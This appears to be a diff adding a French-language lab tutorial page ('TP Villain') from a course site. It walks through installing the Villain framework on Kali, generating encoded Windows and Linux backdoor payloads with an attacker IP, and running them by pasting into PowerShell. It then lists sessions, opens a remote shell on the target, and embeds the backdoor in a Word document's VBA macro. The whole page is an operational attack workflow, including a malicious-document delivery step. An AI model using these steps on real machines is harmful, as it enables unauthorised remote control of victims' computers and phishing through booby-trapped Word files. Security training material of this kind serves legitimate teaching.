@@ -1,0 +1,404 @@
+<meta charset="utf-8">
+<script src="assets/js/helpers.js"></script>
+<script>let pathImg = "TP_VILLAIN/";
+getHeader("TP Villain", "Villain permet de mettre en place ou de créer des backdoors : petit programme pouvant être codé en PowerShell/Base64 permettant ainsi de prendre la main sur la machine cible");
+</script>
+
+<div class="col-md-12 mb-20 reveal">
+	<div class="alert alert-primary border-light p-10 mx-md-5 h-md-100 reveal-2">
+		<div class="row d-flex justify-content-center">
+			<div class="col-auto">
+				<div class="alert alert-primary text-dark" role="alert">
+					<h3 class="text-center">
+						Téléchargement de Villain
+					</h3>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="mb-10 mt-5">
+					<p class="text-dark text-start">1. Allez dans le dossier <code>Téléchargements</code> :</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#6B8E23">( </font><font color="#00BFFF"><b>user@kali</b></font><font color="#6B8E23"> )-[</font> <font color="white"><b>~</b></font> <font color="#6B8E23">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">cd Téléchargements/</code></pre>
+						</div>
+					</div>
+				</div>
+				<div class="mb-10">
+					<p class="text-dark text-start">2. Passez en mode Administrateur :</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#6B8E23">( </font><font color="#00BFFF"><b>user@kali</b></font><font color="#6B8E23"> )-[</font> <font color="white"><b>~/Téléchargements</b></font> <font color="#6B8E23">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">sudo su</code></pre>
+						</div>
+					</div>
+				</div>
+				<div class="mb-10">
+					<p class="text-dark text-start">3. Nettoyez la console :</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user/Téléchargements</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">clear</code></pre>
+						</div>
+					</div>
+				</div>
+				<div class="mb-10">
+					<p class="text-dark text-start">4. Clonez le lient git<code>https://github.com/amirouchef/Villain.git</code> :</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user/Téléchargements</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">git clone https://github.com/amirouchef/Villain.git</code></pre>
+						</div>
+					</div>
+				</div>
+				<div class="mb-10">
+					<p class="text-dark text-start">5. Vérifiez que le dossier <code>Villain</code> a bien été téléchargé :</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user/Téléchargements</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">ls -la</code></pre>
+						</div>
+					</div>
+				</div>
+				<div class="mb-10">
+					<p class="text-dark text-start">6. Accédez au dossier <code>Villain</code> téléchargé :</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user/Téléchargements</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">cd Villain/</code></pre>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="col-md-12 mb-20 reveal">
+	<div class="alert alert-primary border-light p-10 mx-md-5 h-md-100 reveal-3">
+		<div class="row d-flex justify-content-center">
+			<div class="col-auto">
+				<div class="alert alert-primary text-dark" role="alert">
+					<h3 class="text-center">
+						Dossier Villain
+					</h3>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="mb-10 mt-5">
+					<p class="text-dark text-start">Voir le contenu du dossier :</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user/Téléchargements/Villain</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">ls -la</code></pre>
+						</div>
+					</div>
+				</div>
+				<div class="mb-10">
+					<p class="text-dark text-start">Voir le contenu d'un fichier :</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user/Téléchargements/Villain</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">cat requirements.txt</code></pre>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="col-md-12 mb-20 reveal">
+	<div class="alert alert-primary border-light p-10 mx-md-5 h-md-100 reveal-4">
+		<div class="row d-flex justify-content-center">
+			<div class="col-auto">
+				<div class="alert alert-primary text-dark" role="alert">
+					<h3 class="text-center">
+						Installer les librairies <i style="color: #FFF;">(manquantes)</i> de Villain
+					</h3>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="mb-10 mt-5">
+					<p class="text-dark text-start">Installation :</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user/Téléchargements/Villain</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">pip3 install -r requirements.txt</code></pre>
+						</div>
+					</div>
+				</div>
+				<div class="mb-10">
+					<p class="text-dark text-start">Voir le contenu du dossier :</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user/Téléchargements/Villain</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">ls -la</code></pre>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="col-md-12 mb-20 reveal">
+	<div class="alert alert-primary border-light p-10 mx-md-5 h-md-100 reveal-5">
+		<div class="row d-flex justify-content-center">
+			<div class="col-auto">
+				<div class="alert alert-primary text-dark" role="alert">
+					<h3 class="text-center">
+						Lancer le fichier<code>Villain.py</code>
+					</h3>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="mt-5">
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user/Téléchargements/Villain</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">chmod +x Villain.py</code></pre>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="mt-5">
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user/Téléchargements/Villain</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">./Villain.py</code></pre>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="col-md-12 mb-20 reveal">
+	<div class="alert alert-primary border-light p-10 mx-md-5 h-md-100 reveal-5">
+		<div class="row d-flex justify-content-center">
+			<div class="col-auto">
+				<div class="alert alert-primary text-dark" role="alert">
+					<h3 class="text-center">
+						Afficher les commandes possibles
+					</h3>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="mt-5">
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700">Villain &gt;</span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">help</code></pre>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="col-md-12 mb-20 reveal">
+	<div class="alert alert-primary border-light p-10 mx-md-5 h-md-100 reveal-6">
+		<div class="row d-flex justify-content-center">
+			<div class="col-auto">
+				<div class="alert alert-primary text-dark" role="alert">
+					<h3 class="text-center">
+						Générer un backdoor <i>(script pouvant être lancé sur une machine)</i>
+					</h3>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="py-5">
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700">Villain &gt;</span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">help generate</code></pre>
+						</div>
+					</div>
+				</div>
+				<div class="py-5">
+					<p class="text-start" style="color: #FFF;">Pour Windows :</p>
+					<div class="mb-5">
+						<div class="highlight">
+							<div class="text-start"><span class="text-gray-700">Villain &gt;</span></div>
+							<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+							<div class="highlight-code">
+								<pre class="language-bash mt-2"><code class="language-bash fs-4">generate os=windows lhost=[IP]</code></pre>
+							</div>
+						</div>
+					</div>
+					<div class="mb-5">
+						<div class="highlight">
+							<div class="text-start"><span class="text-gray-700">Villain &gt;</span></div>
+							<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+							<div class="highlight-code">
+								<pre class="language-bash mt-2"><code class="language-bash fs-4">generate os=windows lhost=[IP] encode</code></pre>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="py-5">
+					<p class="text-start" style="color: #FFF;">Pour Linux :</p>
+					<div class="mb-5">
+						<div class="highlight">
+							<div class="text-start"><span class="text-gray-700">Villain &gt;</span></div>
+							<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+							<div class="highlight-code">
+								<pre class="language-bash mt-2"><code class="language-bash fs-4">generate os=linux lhost=[IP]</code></pre>
+							</div>
+						</div>
+					</div>
+					<div class="mb-5">
+						<div class="highlight">
+							<div class="text-start"><span class="text-gray-700">Villain &gt;</span></div>
+							<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+							<div class="highlight-code">
+								<pre class="language-bash mt-2"><code class="language-bash fs-4">generate os=linux lhost=[IP] encode</code></pre>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="py-5">
+					<p class="text-start" style="color: #FFF;">Exécuter le backdoor :</p>
+					<ol class="fs-4 mt-5 text-start" style="color: #FFF;">
+						<li class="mb-5">Copier le contenu présent entre<code>Generating backdoor payload...</code>et<code>Copied to clipboard!</code></li>
+						<li class="mb-5">Ouvrez la console<code>Windows PowerShell</code></li>
+						<li>Coller la sélection copiée</li>
+					</ol>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="col-md-12 mb-20 reveal">
+	<div class="alert alert-primary border-light p-10 mx-md-5 h-md-100 reveal-7">
+		<div class="row d-flex justify-content-center">
+			<div class="col-auto">
+				<div class="alert alert-primary text-dark" role="alert">
+					<h3 class="text-center">
+						Voir les sessions ouvertes
+					</h3>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="mt-5">
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700">Villain &gt;</span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">sessions</code></pre>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="col-md-12 mb-20 reveal">
+	<div class="alert alert-primary border-light p-10 mx-md-5 h-md-100 reveal-7">
+		<div class="row d-flex justify-content-center">
+			<div class="col-auto">
+				<div class="alert alert-primary text-dark" role="alert">
+					<h3 class="text-center">
+						Ouvrir un<code>shell</code>
+					</h3>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="mt-5">
+					<div class="mb-5">
+						<div class="highlight">
+							<div class="text-start"><span class="text-gray-700">Villain &gt;</span></div>
+							<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+							<div class="highlight-code">
+								<pre class="language-bash mt-2"><code class="language-bash fs-4">sessions</code></pre>
+							</div>
+						</div>
+					</div>
+					<div class="mb-5">
+						<div class="highlight">
+							<div class="text-start"><span class="text-gray-700">Villain &gt;</span></div>
+							<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+							<div class="highlight-code">
+								<pre class="language-bash mt-2"><code class="language-bash fs-4">shell [Session-ID]</code></pre>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="col-md-12 mb-20 reveal">
+	<div class="alert alert-primary border-light p-10 mx-md-5 h-md-100 reveal-8">
+		<div class="row d-flex justify-content-center">
+			<div class="col-auto">
+				<div class="alert alert-primary text-dark" role="alert">
+					<h3 class="text-center">
+						Activer le mode<code>Développeur</code> sur Word
+					</h3>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="mt-5">
+					<p class="text-start" style="color: #FFF;">1. Ouvrez<code class="bg-info">Word</code></p>
+					<p class="text-start" style="color: #FFF;">2. Cliquez sur<code class="bg-info">Document vierge</code>pour créer un nouveau fichier</p>
+					<p class="text-start" style="color: #FFF;">3. Cliquez sur<code class="bg-info">Fichier</code>en haut à gauche</p>
+					<p class="text-start" style="color: #FFF;">4. Cliquez sur<code class="bg-info">Options</code>en bas à gauche</p>
+					<p class="text-start" style="color: #FFF;">5. Cliquez sur<code class="bg-info">Personnaliser le ruban</code></p>
+					<p class="text-start" style="color: #FFF;">6. Cochez<code class="bg-info">Développeur</code>à droite</p>
+					<p class="text-start" style="color: #FFF;">7. Cliquez sur<code class="bg-info">OK</code>en bas à droite</p>
+					<p class="text-start" style="color: #FFF;">8. Allez dans la section<code class="bg-info">Développeur</code>en haut à droite</p>
+					<p class="text-start" style="color: #FFF;">9. Cliquez sur<code class="bg-info">Visual Basic</code>en haut à droite</p>
+					<p class="text-start" style="color: #FFF;">10. Double-cliquez sur<code class="bg-info">ThisDocument</code></p>
+					<p class="text-start" style="color: #FFF;">11. Collez le backdoor copié</p>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<script>
+nextButton(170, 8, "tp-cloudflare.html", "TP Cloudflare");
+getFooter();
+</script>
